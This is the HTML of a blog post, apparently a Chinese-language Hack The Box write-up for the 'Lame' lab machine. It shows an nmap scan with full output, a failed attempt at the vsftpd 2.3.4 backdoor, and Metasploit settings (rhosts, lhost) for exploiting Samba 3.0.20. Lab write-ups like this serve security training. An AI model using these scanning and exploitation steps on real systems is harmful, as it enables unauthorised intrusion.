@@ -1,0 +1,315 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB Lame | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="Lame (Linux · Easy)SMB
+枚举nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445nmap -A -v -p- -T4 -Pn 10.10.10.3Nmap scan report for bogon (10.10.10.3)Host is up (0.32s latency).Not shown: 65530 filtered tcp ports (no-response)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: |   STAT: | FTP server status:|      Connected to 10.10.16.38|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      vsFTPd 2.3.4 - secure, fast, stable|_End of status22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_smb2-time: Protocol negotiation failed (SMB2)| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb-os-discovery: |   OS: Unix (Samba 3.0.20-Debian)|   Computer name: lame|   NetBIOS computer name: |   Domain name: hackthebox.gr|   FQDN: lame.hackthebox.gr|_  System time: 2024-07-29T02:32:28-04:00|_clock-skew: mean: 1h51m54s, deviation: 2h49m45s, median: -8m07s
+
+21端口，ftp默认凭据anonymous:anonymous，版本信息(vsFTPD 2.3.4)，找到CVE-2011-2523，测试失败
+
+445端口，SMB，版本信息(lame server (Samba 3.0.20-Debian))
+
+MSF"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB Lame"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB Lame</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Lame-Linux-·-Easy"><a href="#Lame-Linux-·-Easy" class="headerlink" title="Lame (Linux · Easy)"></a>Lame (Linux · Easy)</h1><p>SMB</p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v -p- -T4 -Pn 10.10.10.3</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (10.10.10.3)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65530 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.16.38</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: lame</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: hackthebox.gr</span><br><span class="line">|   FQDN: lame.hackthebox.gr</span><br><span class="line">|_  System time: 2024-07-29T02:32:28-04:00</span><br><span class="line">|_clock-skew: mean: 1h51m54s, deviation: 2h49m45s, median: -8m07s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>21端口，ftp默认凭据<code>anonymous:anonymous</code>，版本信息(vsFTPD 2.3.4)，找到CVE-2011-2523，测试失败</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240729144704013.png" alt="image-20240729144704013"></p>
+<p>445端口，SMB，版本信息(lame server (Samba 3.0.20-Debian))</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240729145453133.png" alt="image-20240729145453133"></p>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>打SMB</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240729151016637.png" alt="image-20240729151016637"></p>
+<p>设置好参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhosts 10.10.10.3</span><br><span class="line">set lhost 10.10.16.38</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240729151825285.png" alt="image-20240729151825285"></p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/05/22/writeup/htb/HTB BoardLight/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/05/12/writeup/htb/HTB Perfection/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-05-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Writeup/">Writeup<span>13</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Lame-Linux-%C2%B7-Easy"><span class="toc-article-text">Lame (Linux · Easy)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">枚举</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MSF"><span class="toc-article-text">MSF</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
